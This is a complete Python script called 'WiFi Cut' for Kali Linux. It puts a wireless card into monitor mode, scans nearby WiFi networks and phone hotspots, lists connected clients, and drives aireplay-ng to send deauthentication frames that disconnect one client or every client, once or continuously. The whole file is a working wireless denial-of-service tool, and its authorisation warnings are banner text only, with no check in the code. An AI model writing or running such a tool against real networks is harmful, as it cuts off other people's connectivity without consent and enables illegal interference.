#!/usr/bin/env python3
"""
WiFi Cut - WiFi scanner and deauth tool for Kali Linux
For authorized security testing, owned-network auditing, and education only.
"""

import argparse
import csv
import os
import re
import signal
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, List, Optional, Tuple

# ── Colors ────────────────────────────────────────────────────────────────────
R  = "\033[91m"
G  = "\033[92m"
Y  = "\033[93m"
C  = "\033[96m"
B  = "\033[94m"
W  = "\033[97m"
GR = "\033[90m"
BD = "\033[1m"
RS = "\033[0m"

BANNER = f"""
{BD}{C}╔══════════════════════════════════════════════════════════╗
║              WiFi Cut  -  Wireless Network Tool          ║
║        Scan WiFi / Hotspots  ·  Disconnect Clients       ║
╚══════════════════════════════════════════════════════════╝{RS}
{R}  ⚠  WARNING: Use only on networks you own or are authorized to test!{RS}
{R}  ⚠  Unauthorized interference is illegal in most jurisdictions.{RS}
"""


@dataclass
class Client:
    mac: str
    power: str = ""
    packets: str = ""
    bssid: str = ""


@dataclass
class Network:
    bssid: str
    channel: str
    power: str
    encryption: str
    essid: str
    clients: List[Client] = field(default_factory=list)

    @property
    def display_name(self) -> str:
        return self.essid if self.essid else "<Hidden>"


# ── Helpers ───────────────────────────────────────────────────────────────────

def run_cmd(cmd: List[str], timeout: int = 30) -> Tuple[int, str, str]:
    try:
        r = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout
        )
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"
    except FileNotFoundError:
        return -1, "", f"Command not found: {cmd[0]}"


def require_root():
    if os.geteuid() != 0:
        print(f"{R}Error: root privileges required. Run with sudo.{RS}")
        sys.exit(1)


def check_dependencies():
    missing = []
    for tool in ("airmon-ng", "airodump-ng", "aireplay-ng", "iw"):
        code, _, _ = run_cmd(["which", tool])
        if code != 0:
            missing.append(tool)
    if missing:
        print(f"{R}Missing dependencies: {', '.join(missing)}{RS}")
        print(f"{Y}Install on Kali: sudo apt install aircrack-ng iw{RS}")
        sys.exit(1)


def get_wifi_interfaces() -> List[str]:
    code, out, _ = run_cmd(["iw", "dev"])
    if code != 0:
        return []
    interfaces = []
    for line in out.splitlines():
        m = re.match(r"\s*Interface\s+(\w+)", line)
        if m:
            interfaces.append(m.group(1))
    return interfaces


def kill_conflicting_processes():
    print(f"{GR}Killing conflicting processes...{RS}")
    run_cmd(["airmon-ng", "check", "kill"], timeout=15)


def find_monitor_interface(original_iface: str) -> Optional[str]:
    """Find an interface currently in monitor mode."""
    code, out, _ = run_cmd(["iw", "dev"])
    if code != 0:
        return None

    candidates: List[str] = []
    current_iface: Optional[str] = None
    is_monitor = False

    for line in out.splitlines():
        m = re.match(r"\s*Interface\s+(\w+)", line)
        if m:
            current_iface = m.group(1)
            is_monitor = False
        if current_iface and re.search(r"type\s+monitor", line, re.I):
            is_monitor = True
            candidates.append(current_iface)
            current_iface = None
            is_monitor = False

    for name in candidates:
        if name.startswith(original_iface) or original_iface in name:
            return name
    return candidates[0] if candidates else None


def start_monitor(iface: str) -> str:
    """Switch interface to monitor mode and return monitor interface name."""
    kill_conflicting_processes()
    code, out, err = run_cmd(["airmon-ng", "start", iface], timeout=20)
    combined = out + err

    # Prefer explicit airmon-ng message: "monitor mode enabled on [wlan0mon]"
    m = re.search(r"monitor mode.*?\[(\w+)\]", combined, re.I)
    if m and not m.group(1).startswith("phy"):
        mon = m.group(1)
        code3, out3, _ = run_cmd(["iw", "dev", mon, "info"])
        if code3 == 0 and "monitor" in out3.lower():
            return mon

    mon = find_monitor_interface(iface)
    if mon:
        return mon

    for candidate in (f"{iface}mon", iface):
        code3, out3, _ = run_cmd(["iw", "dev", candidate, "info"])
        if code3 == 0 and "monitor" in out3.lower():
            return candidate

    print(f"{R}Failed to enable monitor mode. Output: {combined}{RS}")
    sys.exit(1)


def stop_monitor(mon_iface: str, original_iface: str):
    print(f"{GR}Restoring interface mode...{RS}")
    run_cmd(["airmon-ng", "stop", mon_iface], timeout=15)
    if mon_iface != original_iface:
        run_cmd(["airmon-ng", "stop", original_iface], timeout=15)
    run_cmd(["airmon-ng", "stop", f"{original_iface}mon"], timeout=15)


def parse_airodump_csv(prefix: str) -> Tuple[Dict[str, Network], Dict[str, List[Client]]]:
    """Parse airodump-ng CSV output."""
    networks: Dict[str, Network] = {}
    clients_by_bssid: Dict[str, List[Client]] = {}

    ap_file = f"{prefix}-01.csv"
    if not os.path.exists(ap_file):
        return networks, clients_by_bssid

    with open(ap_file, "r", encoding="utf-8", errors="replace") as f:
        content = f.read()

    sections = content.split("\n\n")
    for section in sections:
        lines = [l for l in section.strip().splitlines() if l.strip()]
        if not lines:
            continue

        header = lines[0]
        if "BSSID" in header and "ESSID" in header:
            for row in csv.reader(lines[1:]):
                if len(row) < 14:
                    continue
                bssid = row[0].strip()
                if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid):
                    continue
                net = Network(
                    bssid=bssid,
                    channel=row[3].strip(),
                    power=row[8].strip(),
                    encryption=row[5].strip(),
                    essid=row[13].strip(),
                )
                networks[bssid] = net

        elif "Station MAC" in header and "BSSID" in header:
            for row in csv.reader(lines[1:]):
                if len(row) < 6:
                    continue
                client_mac = row[0].strip()
                bssid = row[5].strip()
                if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", client_mac):
                    continue
                if bssid == "(not associated)" or not bssid:
                    continue
                client = Client(
                    mac=client_mac,
                    power=row[3].strip() if len(row) > 3 else "",
                    packets=row[4].strip() if len(row) > 4 else "",
                    bssid=bssid,
                )
                clients_by_bssid.setdefault(bssid, []).append(client)

    for bssid, clients in clients_by_bssid.items():
        if bssid in networks:
            networks[bssid].clients = clients

    return networks, clients_by_bssid


def scan_networks(mon_iface: str, duration: int = 15) -> Dict[str, Network]:
    """Scan nearby WiFi networks and connected clients."""
    tmp_dir = tempfile.mkdtemp(prefix="wificut_")
    prefix = os.path.join(tmp_dir, "scan")

    print(f"\n{C}Scanning wireless networks ({duration}s)...{RS}")
    print(f"{GR}Includes routers, WiFi APs, and phone hotspots/tethering{RS}\n")

    proc = subprocess.Popen(
        ["airodump-ng", "--band", "abg", "--output-format", "csv", "-w", prefix, mon_iface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )

    for i in range(duration):
        remaining = duration - i
        print(f"\r  {GR}Scanning... {remaining:2d}s remaining{RS}", end="", flush=True)
        time.sleep(1)

    proc.send_signal(signal.SIGINT)
    try:
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait(timeout=3)

    time.sleep(1)  # allow airodump-ng to flush CSV

    print(f"\r  {G}Scan complete!{RS}                         ")

    networks, _ = parse_airodump_csv(prefix)

    for f in Path(tmp_dir).glob("*"):
        f.unlink(missing_ok=True)
    os.rmdir(tmp_dir)

    return networks


def display_networks(networks: Dict[str, Network]):
    if not networks:
        print(f"{Y}No WiFi networks detected. Check monitor mode support and nearby signals.{RS}")
        return

    sorted_nets = sorted(
        networks.values(),
        key=lambda n: int(n.power) if n.power.lstrip("-").isdigit() else -999,
        reverse=True,
    )

    print(f"\n{BD}{'─' * 78}{RS}")
    print(f"{BD}  {'#':<4} {'Name':<22} {'BSSID':<18} {'CH':<5} {'Signal':<6} {'Enc':<8} {'Clients'}{RS}")
    print(f"{BD}{'─' * 78}{RS}")

    for idx, net in enumerate(sorted_nets, 1):
        enc = net.encryption[:7] if net.encryption else "?"
        power = f"{net.power} dBm" if net.power else "?"
        client_count = len(net.clients)
        marker = f"{Y}📱{RS}" if any(
            kw in net.display_name.lower()
            for kw in ("iphone", "android", "huawei", "xiaomi", "oppo", "vivo", "galaxy", "hotspot")
        ) else "  "
        print(
            f"  {C}{idx:<4}{RS} {marker}{W}{net.display_name:<20}{RS} "
            f"{GR}{net.bssid:<18}{RS} {net.channel:<5} {power:<6} {enc:<8} {client_count}"
        )

    print(f"{BD}{'─' * 78}{RS}")
    print(f"{GR}  📱 = likely phone hotspot / tethering{RS}\n")


def display_clients(net: Network):
    print(f"\n{BD}Target network: {W}{net.display_name}{RS} ({net.bssid})")
    print(f"{BD}{'─' * 50}{RS}")

    if not net.clients:
        print(f"{Y}  No connected clients detected (low traffic or short scan){RS}")
        print(f"{GR}  You can still broadcast deauth frames to disconnect all clients{RS}")
        return

    print(f"  {'#':<4} {'Client MAC':<20} {'Signal':<8} {'Packets'}")
    print(f"  {'─' * 45}")
    for idx, client in enumerate(net.clients, 1):
        print(f"  {idx:<4} {client.mac:<20} {client.power:<8} {client.packets}")
    print()


def deauth_attack(
    mon_iface: str,
    bssid: str,
    client_mac: Optional[str] = None,
    count: int = 0,
    interval: float = 1.0,
):
    """
    Send deauth frames to disconnect clients.
    count=0 means continuous attack until user interrupts.
    """
    target_desc = client_mac if client_mac else "all connected clients"
    print(f"\n{R}{BD}▶ Disconnecting: {target_desc}{RS}")
    print(f"{GR}  Target AP: {bssid}{RS}")
    if count == 0:
        print(f"{Y}  Mode: continuous (Ctrl+C to stop){RS}")
    else:
        print(f"{GR}  Sending {count} deauth burst(s){RS}")

    cmd = ["aireplay-ng", "-0"]
    if count == 0:
        cmd.append("0")
    else:
        cmd.append(str(count))
    cmd.extend(["-a", bssid])
    if client_mac:
        cmd.extend(["-c", client_mac])
    cmd.append(mon_iface)

    if count == 0:
        burst = 10
        total_sent = 0
        try:
            while True:
                burst_cmd = ["aireplay-ng", "-0", str(burst), "-a", bssid]
                if client_mac:
                    burst_cmd.extend(["-c", client_mac])
                burst_cmd.append(mon_iface)
                code, out, err = run_cmd(burst_cmd, timeout=burst + 10)
                total_sent += burst
                print(f"\r  {R}Deauth bursts sent: {total_sent}{RS}", end="", flush=True)
                time.sleep(interval)
        except KeyboardInterrupt:
            print(f"\n{Y}  Attack stopped.{RS}")
    else:
        code, out, err = run_cmd(cmd, timeout=count * 3 + 30)
        if code == 0:
            print(f"{G}  Deauth attack complete.{RS}")
        else:
            print(f"{R}  Attack may have failed: {err or out}{RS}")


def interactive_mode(mon_iface: str):
    while True:
        networks = scan_networks(mon_iface, duration=15)
        display_networks(networks)

        if not networks:
            choice = input(f"{C}Scan again? (y/n): {RS}").strip().lower()
            if choice != "y":
                break
            continue

        try:
            sel = input(f"{C}Select target # (0=quit): {RS}").strip()
            if sel == "0" or not sel:
                break
            idx = int(sel)
            sorted_nets = sorted(
                networks.values(),
                key=lambda n: int(n.power) if n.power.lstrip("-").isdigit() else -999,
                reverse=True,
            )
            if idx < 1 or idx > len(sorted_nets):
                print(f"{R}Invalid selection{RS}")
                continue
            target = sorted_nets[idx - 1]
        except ValueError:
            print(f"{R}Please enter a number{RS}")
            continue

        display_clients(target)

        print(f"{BD}Disconnect options:{RS}")
        print(f"  1. Disconnect all clients on this WiFi")
        print(f"  2. Disconnect a specific client")
        print(f"  3. Continuous disconnect (until stopped)")
        print(f"  0. Back to scan")

        opt = input(f"{C}Choose action: {RS}").strip()

        if opt == "0":
            continue
        elif opt == "1":
            count = input(f"{C}Deauth burst count (default 20): {RS}").strip()
            count = int(count) if count.isdigit() else 20
            deauth_attack(mon_iface, target.bssid, count=count)
        elif opt == "2":
            if not target.clients:
                print(f"{Y}No clients detected — disconnecting all{RS}")
                deauth_attack(mon_iface, target.bssid, count=20)
            else:
                csel = input(f"{C}Select client #: {RS}").strip()
                try:
                    ci = int(csel)
                    if 1 <= ci <= len(target.clients):
                        count = input(f"{C}Deauth burst count (default 20): {RS}").strip()
                        count = int(count) if count.isdigit() else 20
                        deauth_attack(
                            mon_iface,
                            target.bssid,
                            client_mac=target.clients[ci - 1].mac,
                            count=count,
                        )
                    else:
                        print(f"{R}Invalid selection{RS}")
                except ValueError:
                    print(f"{R}Please enter a number{RS}")
        elif opt == "3":
            deauth_attack(mon_iface, target.bssid, count=0)
        else:
            print(f"{R}Invalid option{RS}")


def main():
    parser = argparse.ArgumentParser(
        description="WiFi Cut - Kali WiFi scanner and disconnect tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  sudo python3 wifi_cut.py                    # interactive mode
  sudo python3 wifi_cut.py -i wlan0           # specify interface
  sudo python3 wifi_cut.py -i wlan0 --scan 30 # scan for 30 seconds
  sudo python3 wifi_cut.py -i wlan0 -b AA:BB:CC:DD:EE:FF --deauth-all
        """,
    )
    parser.add_argument("-i", "--interface", help="Wireless interface (e.g. wlan0)")
    parser.add_argument("--scan", type=int, default=15, metavar="SEC", help="Scan duration in seconds")
    parser.add_argument("-b", "--bssid", help="Target AP BSSID")
    parser.add_argument("-c", "--client", help="Target client MAC (optional)")
    parser.add_argument("--deauth-all", action="store_true", help="Disconnect all clients on AP")
    parser.add_argument("--deauth-count", type=int, default=20, help="Number of deauth bursts")
    parser.add_argument("--continuous", action="store_true", help="Continuous deauth until interrupted")
    args = parser.parse_args()

    print(BANNER)
    require_root()
    check_dependencies()

    ifaces = get_wifi_interfaces()
    if not ifaces:
        print(f"{R}No wireless interfaces found{RS}")
        sys.exit(1)

    if args.interface:
        iface = args.interface
        if iface not in ifaces:
            print(f"{Y}Warning: {iface} not in detected list {ifaces}, still trying{RS}")
    else:
        print(f"{C}Detected wireless interfaces:{RS}")
        for i, name in enumerate(ifaces, 1):
            print(f"  {i}. {name}")
        if len(ifaces) == 1:
            iface = ifaces[0]
            print(f"{GR}Auto-selected: {iface}{RS}")
        else:
            sel = input(f"{C}Select interface #: {RS}").strip()
            try:
                iface = ifaces[int(sel) - 1]
            except (ValueError, IndexError):
                print(f"{R}Invalid selection{RS}")
                sys.exit(1)

    print(f"\n{G}Using interface: {iface}{RS}")
    mon_iface = start_monitor(iface)
    print(f"{G}Monitor mode: {mon_iface}{RS}")

    try:
        if args.bssid and (args.deauth_all or args.client or args.continuous):
            count = 0 if args.continuous else args.deauth_count
            deauth_attack(mon_iface, args.bssid, args.client, count=count)
        elif args.bssid:
            networks = scan_networks(mon_iface, args.scan)
            if args.bssid in networks:
                display_clients(networks[args.bssid])
            else:
                print(f"{Y}BSSID not found in scan results: {args.bssid}{RS}")
        else:
            interactive_mode(mon_iface)
    finally:
        stop_monitor(mon_iface, iface)
        print(f"\n{G}Done. Interface restored.{RS}")


if __name__ == "__main__":
    main()
